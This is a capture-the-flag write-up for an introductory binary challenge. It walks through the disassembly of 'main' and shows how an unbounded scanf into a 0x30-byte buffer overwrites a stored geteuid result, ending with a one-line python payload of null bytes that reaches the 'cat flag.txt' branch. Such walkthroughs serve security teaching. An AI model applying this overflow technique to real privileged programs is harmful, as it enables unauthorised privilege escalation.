## Basic inspection
This is an intro chall so let's dive directly into the asm.

`objdump --disassemble=main -Mintel uid`:
```
0000000000001175 <main>:
    1175:       55                      push   rbp
    1176:       48 89 e5                mov    rbp,rsp
    1179:       48 83 ec 30             sub    rsp,0x30
    117d:       e8 ce fe ff ff          call   1050 <geteuid@plt>
    1182:       89 45 fc                mov    DWORD PTR [rbp-0x4],eax
    1185:       48 8d 3d 78 0e 00 00    lea    rdi,[rip+0xe78]        # 2004 <_IO_stdin_used+0x4>
    118c:       b8 00 00 00 00          mov    eax,0x0
    1191:       e8 aa fe ff ff          call   1040 <printf@plt>
    1196:       48 8b 05 b3 2e 00 00    mov    rax,QWORD PTR [rip+0x2eb3]        # 4050 <stdout@GLIBC_2.2.5>
    119d:       48 89 c7                mov    rdi,rax
    11a0:       e8 bb fe ff ff          call   1060 <fflush@plt>
    11a5:       48 8d 45 d0             lea    rax,[rbp-0x30]
    11a9:       48 89 c6                mov    rsi,rax
    11ac:       48 8d 3d 5c 0e 00 00    lea    rdi,[rip+0xe5c]        # 200f <_IO_stdin_used+0xf>
    11b3:       b8 00 00 00 00          mov    eax,0x0
    11b8:       e8 b3 fe ff ff          call   1070 <__isoc99_scanf@plt>
    11bd:       83 7d fc 00             cmp    DWORD PTR [rbp-0x4],0x0
    11c1:       75 0e                   jne    11d1 <main+0x5c>
    11c3:       48 8d 3d 48 0e 00 00    lea    rdi,[rip+0xe48]        # 2012 <_IO_stdin_used+0x12>
    11ca:       e8 61 fe ff ff          call   1030 <system@plt>
    11cf:       eb 0c                   jmp    11dd <main+0x68>
    11d1:       48 8d 3d 47 0e 00 00    lea    rdi,[rip+0xe47]        # 201f <_IO_stdin_used+0x1f>
    11d8:       e8 53 fe ff ff          call   1030 <system@plt>
    11dd:       b8 00 00 00 00          mov    eax,0x0
    11e2:       c9                      leave
    11e3:       c3                      ret
```

The important part is:
```
...
    1179:       48 83 ec 30             sub    rsp,0x30
...
    11a5:       48 8d 45 d0             lea    rax,[rbp-0x30]
    11a9:       48 89 c6                mov    rsi,rax
...
    11b8:       e8 b3 fe ff ff          call   1070 <__isoc99_scanf@plt>
    11bd:       83 7d fc 00             cmp    DWORD PTR [rbp-0x4],0x0
    11c1:       75 0e                   jne    11d1 <main+0x5c>
    11c3:       48 8d 3d 48 0e 00 00    lea    rdi,[rip+0xe48]        # 2012 <_IO_stdin_used+0x12>
    11ca:       e8 61 fe ff ff          call   1030 <system@plt>
...
    11d1:       48 8d 3d 47 0e 00 00    lea    rdi,[rip+0xe47]        # 201f <_IO_stdin_used+0x1f>
    11d8:       e8 53 fe ff ff          call   1030 <system@plt>
...
```
We learn that: 
- the buffer is `0x30`  
- we write into the buffer with `scanf` 
- there is two call to system

## Exploitation
Let's execute the binary:
```
$ ./uid
username: AAAA
cat: flop.txt: No such file or directory
```

Because in local `flop.txt` doesn't exists we get an error but we guess that these `system` calls are some `cat ...` which is confirmed by `strings uid`:
```
...
[]A\A]A^A_
username:
cat flag.txt
cat flop.txt
...
```

The first system call is conditional so this is the one we must reach!

To do so, we have to fill the buffer with null bytes to satisfy the `cmp    DWORD PTR [rbp-0x4],0x0`.

The simplest solution is then:  
`python -c 'print("\x00"*0x30)' | ./uid`
